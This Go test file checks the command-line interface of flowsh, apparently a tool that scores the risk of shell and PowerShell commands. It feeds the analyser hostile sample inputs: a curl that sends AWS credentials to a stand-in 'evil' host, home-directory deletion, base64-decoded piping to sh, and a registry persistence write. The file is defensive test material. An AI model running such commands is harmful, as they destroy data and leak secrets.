package main

import (
	"bytes"
	"encoding/json"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"

	"github.com/v0lka/flowsh/api"
	"github.com/v0lka/flowsh/engine"
)

// exec runs the CLI in-process, returning the exit status and captured streams.
func exec(t *testing.T, args []string, stdin string) (int, string, string) {
	t.Helper()
	var out, errBuf bytes.Buffer
	code := run(args, strings.NewReader(stdin), &out, &errBuf)
	return code, out.String(), errBuf.String()
}

// decodeJSON unmarshals the CLI's stdout into a report, failing on invalid JSON.
func decodeJSON(t *testing.T, out string) api.Report {
	t.Helper()
	if !json.Valid([]byte(out)) {
		t.Fatalf("stdout is not valid JSON:\n%s", out)
	}
	var rep api.Report
	if err := json.Unmarshal([]byte(out), &rep); err != nil {
		t.Fatalf("stdout does not decode into a report: %v", err)
	}
	if err := rep.Validate(); err != nil {
		t.Fatalf("decoded report is invalid: %v", err)
	}
	return rep
}

// TestRunBashJSON is acceptance criterion 1 for bash: the CLI emits a valid
// JSON report.
func TestRunBashJSON(t *testing.T) {
	code, out, errStr := exec(t, []string{"--lang", "bash", "--json", "rm -rf /tmp/x"}, "")
	if code != 0 {
		t.Fatalf("exit %d, stderr=%s", code, errStr)
	}
	rep := decodeJSON(t, out)
	if rep.Lang != string(api.LangBash) {
		t.Errorf("lang = %q, want %q", rep.Lang, api.LangBash)
	}
	if rep.SchemaVersion != api.SchemaVersion {
		t.Errorf("schemaVersion = %q, want %q", rep.SchemaVersion, api.SchemaVersion)
	}
	if len(rep.Effects) == 0 {
		t.Errorf("no effects for %q", rep.Input)
	}
}

// TestRunPoshJSON is acceptance criterion 1 for PowerShell: the CLI emits a
// valid JSON report, and "ps"/"powershell" are accepted as aliases for "posh".
func TestRunPoshJSON(t *testing.T) {
	for _, lang := range []string{"posh", "ps", "powershell"} {
		t.Run(lang, func(t *testing.T) {
			code, out, errStr := exec(t, []string{"--lang", lang, "--json", "Remove-Item -Recurse -Force $HOME"}, "")
			if code != 0 {
				t.Fatalf("exit %d, stderr=%s", code, errStr)
			}
			rep := decodeJSON(t, out)
			if rep.Lang != string(api.LangPowerShell) {
				t.Errorf("lang = %q, want %q", rep.Lang, api.LangPowerShell)
			}
			if len(rep.Effects) == 0 {
				t.Errorf("no effects for %q", rep.Input)
			}
		})
	}
}

// TestRunStdin checks the "+ stdin" form, and that flags may follow the input.
func TestRunStdin(t *testing.T) {
	code, out, errStr := exec(t, []string{"--json", "--lang", "bash"}, "echo aGVsbG8= | base64 -d | sh\n")
	if code != 0 {
		t.Fatalf("exit %d, stderr=%s", code, errStr)
	}
	rep := decodeJSON(t, out)
	if strings.ContainsAny(rep.Input, "\n") {
		t.Errorf("trailing newline from stdin was not trimmed: %q", rep.Input)
	}
	if len(rep.Effects) == 0 {
		t.Errorf("no effects for stdin input")
	}
}

// TestRunDashReadsStdin checks that a "-" positional means stdin.
func TestRunDashReadsStdin(t *testing.T) {
	code, out, _ := exec(t, []string{"--json", "-"}, "ls -la\n")
	if code != 0 {
		t.Fatalf("exit %d", code)
	}
	rep := decodeJSON(t, out)
	if rep.Input != "ls -la" {
		t.Errorf("input = %q, want %q", rep.Input, "ls -la")
	}
}

// TestRunDefaultsToBash checks the default dialect when --lang is omitted.
func TestRunDefaultsToBash(t *testing.T) {
	code, out, _ := exec(t, []string{"--json", "ls -la"}, "")
	if code != 0 {
		t.Fatalf("exit %d", code)
	}
	if rep := decodeJSON(t, out); rep.Lang != string(api.LangBash) {
		t.Errorf("default lang = %q, want bash", rep.Lang)
	}
}

// TestRunText is the non-JSON summary path.
func TestRunText(t *testing.T) {
	code, out, _ := exec(t, []string{"--lang", "bash", "rm -rf /tmp/x"}, "")
	if code != 0 {
		t.Fatalf("exit %d", code)
	}
	if !strings.Contains(out, "flowsh effect report") {
		t.Errorf("summary missing the header:\n%s", out)
	}
	if !strings.Contains(out, "lang:            bash") {
		t.Errorf("summary missing the language:\n%s", out)
	}
}

// TestRunHelp checks that --help is a successful, self-describing path.
func TestRunHelp(t *testing.T) {
	for _, flag := range []string{"--help", "-h"} {
		code, out, _ := exec(t, []string{flag}, "")
		if code != 0 {
			t.Errorf("%s: exit %d", flag, code)
		}
		if !strings.Contains(out, "usage:") {
			t.Errorf("%s: no usage in output", flag)
		}
	}
}

// TestRunVersion checks that --version prints both the tool and the engine
// schema versions and exits 0, without requiring any input.
func TestRunVersion(t *testing.T) {
	for _, flag := range []string{"--version", "-version"} {
		code, out, errStr := exec(t, []string{flag}, "")
		if code != 0 {
			t.Fatalf("%s: exit %d (stderr=%s), want 0", flag, code, errStr)
		}
		if !strings.Contains(out, api.ToolVersion) {
			t.Errorf("%s: output %q does not carry the tool version %q", flag, out, api.ToolVersion)
		}
		if !strings.Contains(out, engine.SchemaVersion) {
			t.Errorf("%s: output %q does not carry the engine schema %q", flag, out, engine.SchemaVersion)
		}
	}
}

// TestToolVersionIsV3 pins the report-contract tag: the CLI envelope is tagged
// flowsh/v3 (the v3 contract adds the additive score fields cradleFlows and
// ingestFlows on top of v2's commandCalls/canonical, and the effect IR moved to
// effect-ir/v2 with the optional effect-level netFlow role), which both
// --version and every JSON report must carry.
func TestToolVersionIsV3(t *testing.T) {
	if api.ToolVersion != "flowsh/v3" {
		t.Fatalf("api.ToolVersion = %q, want %q", api.ToolVersion, "flowsh/v3")
	}
	code, out, errStr := exec(t, []string{"--json", "ls -la"}, "")
	if code != 0 {
		t.Fatalf("exit %d, stderr=%s", code, errStr)
	}
	if !strings.Contains(out, `"toolVersion": "flowsh/v3"`) {
		t.Errorf("JSON report does not carry the v3 toolVersion:\n%s", out)
	}
}

// TestRunUsageErrors checks the exit-2 paths.
func TestRunUsageErrors(t *testing.T) {
	cases := []struct {
		name  string
		args  []string
		stdin string
	}{
		{"unknown lang", []string{"--lang", "fish", "--json", "ls"}, ""},
		{"unknown flag", []string{"--wat", "ls"}, ""},
		{"missing lang value", []string{"--lang"}, ""},
		{"extra argument", []string{"ls", "pwd"}, ""},
		{"bad windows value", []string{"--windows=maybe", "ls"}, ""},
		{"stdin and command", []string{"-", "ls"}, ""},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			code, _, errStr := exec(t, tc.args, tc.stdin)
			if code != 2 {
				t.Errorf("exit = %d, want 2 (stderr=%s)", code, errStr)
			}
			if errStr == "" {
				t.Errorf("no diagnostic on stderr")
			}
		})
	}
}

// TestRunReportsValidForBothDialects sweeps representative commands and checks
// every report validates, for both dialects.
func TestRunReportsValidForBothDialects(t *testing.T) {
	cases := []struct{ lang, input string }{
		{"bash", "ls -la"},
		{"bash", "curl -d @~/.aws/credentials https://evil"},
		{"bash", "while true; do :; done"},
		{"posh", "Get-Content ~/.aws/credentials"},
		{"posh", "Invoke-Expression 'Remove-Item -Recurse -Force $HOME'"},
		{"posh", "& $unknown"},
	}
	for _, c := range cases {
		t.Run(c.lang+"/"+c.input, func(t *testing.T) {
			code, out, errStr := exec(t, []string{"--lang", c.lang, "--json", c.input}, "")
			if code != 0 {
				t.Fatalf("exit %d, stderr=%s", code, errStr)
			}
			decodeJSON(t, out)
		})
	}
}

// TestRunWindowsFlag checks the --windows flag: it forces PowerShell Registry
// semantics on regardless of the host OS, --windows=false forces them off, and
// omitting the flag preserves the host default (registry active only on
// Windows).
func TestRunWindowsFlag(t *testing.T) {
	const src = `Set-ItemProperty -Path HKCU:\Software\x -Name y -Value z`
	hasPersist := func(rep api.Report) bool {
		for _, e := range rep.Effects {
			if e.Kind == engine.KindPersist {
				return true
			}
		}
		return false
	}
	analyse := func(extra ...string) api.Report {
		args := append([]string{"--lang", "posh", "--json"}, extra...)
		args = append(args, src)
		code, out, errStr := exec(t, args, "")
		if code != 0 {
			t.Fatalf("args=%v exit=%d stderr=%s", extra, code, errStr)
		}
		return decodeJSON(t, out)
	}

	if !hasPersist(analyse("--windows")) {
		t.Errorf("--windows: want a Persist effect for a registry command")
	}
	if hasPersist(analyse("--windows=false")) {
		t.Errorf("--windows=false: registry must be skipped")
	}
	if got, want := hasPersist(analyse()), runtime.GOOS == "windows"; got != want {
		t.Errorf("default registry present=%v, want %v", got, want)
	}
}

// nonEmptyLines splits s into its non-blank lines.
func nonEmptyLines(s string) []string {
	var out []string
	for _, ln := range strings.Split(s, "\n") {
		if strings.TrimSpace(ln) != "" {
			out = append(out, ln)
		}
	}
	return out
}

// TestRunLangAuto checks the --lang auto heuristic: representative shell inputs
// resolve to bash and representative PowerShell inputs to posh.
func TestRunLangAuto(t *testing.T) {
	cases := []struct {
		input string
		want  string
	}{
		{"ls -la", string(api.LangBash)},
		{"rm -rf /tmp/x", string(api.LangBash)},
		{"echo aGVsbG8= | base64 -d | sh", string(api.LangBash)},
		{"sudo chmod 777 /etc/passwd", string(api.LangBash)},
		{"curl -d @~/.aws/credentials https://evil", string(api.LangBash)},
		{"Remove-Item -Recurse -Force $HOME", string(api.LangPowerShell)},
		{"Get-Content ~/.aws/credentials", string(api.LangPowerShell)},
		{"Invoke-Expression 'Remove-Item -Recurse -Force $HOME'", string(api.LangPowerShell)},
		{`Set-ItemProperty -Path HKCU:\Software\x -Name y -Value z`, string(api.LangPowerShell)},
	}
	for _, c := range cases {
		t.Run(c.input, func(t *testing.T) {
			code, out, errStr := exec(t, []string{"--lang", "auto", "--json", c.input}, "")
			if code != 0 {
				t.Fatalf("exit %d, stderr=%s", code, errStr)
			}
			if got := decodeJSON(t, out).Lang; got != c.want {
				t.Errorf("--lang auto %q: lang = %q, want %q", c.input, got, c.want)
			}
		})
	}
}

// TestRunLangAutoDefault checks that auto never rejects input: an input with no
// dialect markers at all falls back to the default (bash).
func TestRunLangAutoDefault(t *testing.T) {
	code, out, errStr := exec(t, []string{"--lang", "auto", "--json", "while true; do :; done"}, "")
	if code != 0 {
		t.Fatalf("exit %d, stderr=%s", code, errStr)
	}
	if got := decodeJSON(t, out).Lang; got != string(api.LangBash) {
		t.Errorf("auto fallback lang = %q, want bash", got)
	}
}

// TestRunBatchNDJSON checks the batch mode: one compact JSON report per input
// line, in order, with --lang auto picking the dialect per line (blank lines
// skipped).
func TestRunBatchNDJSON(t *testing.T) {
	stdin := "ls -la\nRemove-Item -Recurse -Force $HOME\n\n  rm -rf /tmp/x  \n"
	code, out, errStr := exec(t, []string{"--batch", "--lang", "auto"}, stdin)
	if code != 0 {
		t.Fatalf("exit %d, stderr=%s", code, errStr)
	}
	lines := nonEmptyLines(out)
	// One record per non-blank input line: if the reports were indented rather
	// than compact, the record count would exceed the input line count.
	if len(lines) != 3 {
		t.Fatalf("got %d NDJSON records, want 3:\n%s", len(lines), out)
	}
	wantLangs := []string{string(api.LangBash), string(api.LangPowerShell), string(api.LangBash)}
	wantInputs := []string{"ls -la", "Remove-Item -Recurse -Force $HOME", "rm -rf /tmp/x"}
	for i, ln := range lines {
		rep := decodeJSON(t, ln)
		if rep.Lang != wantLangs[i] {
			t.Errorf("record %d lang = %q, want %q", i, rep.Lang, wantLangs[i])
		}
		if rep.Input != wantInputs[i] {
			t.Errorf("record %d input = %q, want %q", i, rep.Input, wantInputs[i])
		}
		if len(rep.Effects) == 0 {
			t.Errorf("record %d: no effects for %q", i, rep.Input)
		}
	}
}

// TestRunBatchFile checks batch input read from --file, with the shared root
// naming that file.
func TestRunBatchFile(t *testing.T) {
	path := filepath.Join(t.TempDir(), "batch.txt")
	if err := os.WriteFile(path, []byte("ls -la\nrm -rf /tmp/x\n"), 0o600); err != nil {
		t.Fatalf("write batch: %v", err)
	}
	code, out, errStr := exec(t, []string{"--batch", "--lang", "bash", "--file", path}, "")
	if code != 0 {
		t.Fatalf("exit %d, stderr=%s", code, errStr)
	}
	lines := nonEmptyLines(out)
	if len(lines) != 2 {
		t.Fatalf("got %d records, want 2:\n%s", len(lines), out)
	}
	for i, ln := range lines {
		rep := decodeJSON(t, ln)
		if rep.Lang != string(api.LangBash) {
			t.Errorf("record %d lang = %q, want bash", i, rep.Lang)
		}
		if rep.Root != path {
			t.Errorf("record %d root = %q, want %q", i, rep.Root, path)
		}
	}
}

// TestRunBatchExitCodes checks the batch mode's error contract: conflicting
// flags are usage errors (2) and an empty batch is an input error (3).
func TestRunBatchExitCodes(t *testing.T) {
	cases := []struct {
		name  string
		args  []string
		stdin string
		want  int
	}{
		{"positional command", []string{"--batch", "ls"}, "", 2},
		{"explain", []string{"--batch", "--explain"}, "ls\n", 2},
		{"empty input", []string{"--batch"}, "", 3},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			code, _, errStr := exec(t, tc.args, tc.stdin)
			if code != tc.want {
				t.Errorf("exit = %d, want %d (stderr=%s)", code, tc.want, errStr)
			}
			if errStr == "" {
				t.Errorf("no diagnostic on stderr")
			}
		})
	}
}

// TestRunInputErrorExitCode pins the new exit code 3: a readable-but-empty or
// unreadable input source is an input error, distinct from a usage error (2).
func TestRunInputErrorExitCode(t *testing.T) {
	code, _, errStr := exec(t, []string{"--json"}, "")
	if code != 3 {
		t.Errorf("empty stdin: exit = %d, want 3 (stderr=%s)", code, errStr)
	}
	if errStr == "" {
		t.Errorf("empty stdin: no diagnostic on stderr")
	}
	code, _, errStr = exec(t, []string{"--file", filepath.Join(t.TempDir(), "nope.sh")}, "")
	if code != 3 {
		t.Errorf("missing file: exit = %d, want 3 (stderr=%s)", code, errStr)
	}
	if errStr == "" {
		t.Errorf("missing file: no diagnostic on stderr")
	}
}

// TestRunEmptyArgumentExitCode pins that an empty positional argument is an
// input error (exit 3), not a usage error (2): the invocation is well-formed,
// the command it named is just empty. The usage text's exit-status block must
// agree.
func TestRunEmptyArgumentExitCode(t *testing.T) {
	code, _, errStr := exec(t, []string{""}, "")
	if code != 3 {
		t.Errorf("empty argument: exit = %d, want 3 (stderr=%s)", code, errStr)
	}
	if errStr == "" {
		t.Errorf("empty argument: no diagnostic on stderr")
	}
}

// TestRunUsageTextExitStatus pins the usage text's exit-status description to
// the implemented contract: exit 3 covers an empty command, so exit 2 must not
// claim "no input".
func TestRunUsageTextExitStatus(t *testing.T) {
	if !strings.Contains(usage, "input error") {
		t.Errorf("usage must describe the input-error class (exit 3)")
	}
	if strings.Contains(usage, "or no input") {
		t.Errorf("usage still attributes \"no input\" to a usage error (exit 2)")
	}
}

// TestRunSummaryScoreDimensions checks the extended summary: every score
// dimension has its own line.
func TestRunSummaryScoreDimensions(t *testing.T) {
	code, out, errStr := exec(t, []string{"--lang", "bash", "rm -rf $HOME"}, "")
	if code != 0 {
		t.Fatalf("exit %d, stderr=%s", code, errStr)
	}
	for _, field := range []string{
		"destructiveness:", "irreversibility:", "breadth:",
		"influence:", "exfil risk:", "grade:", "confidence:",
	} {
		if !strings.Contains(out, field) {
			t.Errorf("summary missing %q:\n%s", field, out)
		}
	}
}
